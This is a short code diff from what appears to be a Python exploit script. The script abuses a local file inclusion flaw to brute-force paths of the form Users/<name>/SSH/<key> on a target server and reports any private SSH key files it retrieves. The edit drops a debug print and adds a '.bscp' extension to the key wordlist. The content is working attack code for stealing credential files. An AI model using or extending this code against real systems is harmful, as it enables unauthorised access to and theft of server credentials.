@@ -21,7 +21,6 @@ def search_keys(ip, usernames, keys):
         for key in keys:
             path = "Users/{}/SSH/{}".format(username, key)
             payload = URL + LFI + path + QUERY
-            print(path)
             response = requests.get(payload)
             if response.status_code == 200 and "<HTML>" not in response.text:
                 print("Username, key found: ", username, key)
@@ -38,7 +37,7 @@ def main():
     args = parser.parse_args()
 
     username_list = wordlist.Wordlist(args.users).words
-    key_list = wordlist.Wordlist(args.keys).words
+    key_list = wordlist.Wordlist(args.keys, ".bscp").words
     search_keys(args.ip, username_list, key_list)
 
 
